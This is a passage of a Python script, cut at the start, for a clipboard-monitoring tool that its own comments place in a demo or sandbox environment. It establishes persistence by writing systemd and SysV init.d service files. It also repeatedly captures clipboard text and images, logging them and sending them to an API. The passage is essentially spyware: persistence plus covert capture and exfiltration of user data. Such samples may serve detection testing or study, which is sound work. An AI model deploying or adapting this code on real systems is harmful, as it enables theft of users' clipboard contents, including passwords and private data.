        try:
            subprocess.run(['systemctl', 'daemon-reload'], timeout=5, capture_output=True)
            subprocess.run(['systemctl', 'enable', service_name], timeout=5, capture_output=True)
            logging.info(f"Enabled {service_name} in systemd.")
        except Exception as e:
            logging.info(f"Could not register in live systemd (sandbox): {e}")
    except Exception as e:
        logging.error(f"Failed to create Linux service: {e}")

def create_init_d_service():
    """Create SysV init.d service entry in demo environment."""
    service_name = 'clipboardhistory'
    init_file = os.path.join(DEMO_INIT_D, service_name)

    init_content = f"""#!/bin/sh
### BEGIN INIT INFO
# Provides:          {service_name}
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       Clipboard History Monitoring Service
### END INIT INFO

DAEMON={sys.executable}
SCRIPT={os.path.abspath(__file__)}

case "$1" in
  start)
    $DAEMON $SCRIPT &
    ;;
  stop)
    pkill -f "python.*clipboard_monitor"
    ;;
  restart)
    $0 stop
    $0 start
    ;;
  *)
    echo "Usage: $0 {{start|stop|restart}}"
    exit 1
esac

exit 0
"""

    try:
        with open(init_file, 'w') as f:
            f.write(init_content)
        os.chmod(init_file, 0o755)
        logging.info(f"Created SysV init.d service file: {init_file}")
    except Exception as e:
        logging.error(f"Failed to create init.d service: {e}")

def establish_persistence():
    """Establish persistence by creating system services."""
    initialize_demo_environment()

    system = platform.system()
    logging.info(f"Establishing persistence on {system}...")

    if system == 'Windows':
        create_windows_service()
    elif system == 'Linux':
        create_linux_service()
        create_init_d_service()
    else:
        logging.warning(f"Unsupported platform for persistence: {system}")

def monitor_clipboard():
    """Monitor and capture clipboard content (text and images)."""
    text_content = get_clipboard_text()
    image_content = get_clipboard_image()

    if text_content:
        log_to_file(text_content, 'text')
        send_to_api(text_content, 'text')

    if image_content:
        log_to_file(image_content, 'image')
        send_to_api(image_content, 'image')

    if not text_content and not image_content:
        logging.debug("No clipboard content to capture.")

def run_monitor(interval=DEFAULT_INTERVAL, iterations=DEFAULT_ITERATIONS):
    """Run the clipboard monitor for specified iterations."""
    for i in range(iterations):
        logging.info(f"Monitor cycle {i + 1}/{iterations}")
        monitor_clipboard()
        if i < iterations - 1:
            time.sleep(interval)

def main():
    """Main entry point."""
    initialize_demo_clipboard()
    establish_persistence()
    run_monitor(DEFAULT_INTERVAL, DEFAULT_ITERATIONS)
    logging.info("Clipboard monitoring session completed.")

if __name__ == "__main__":
    main()

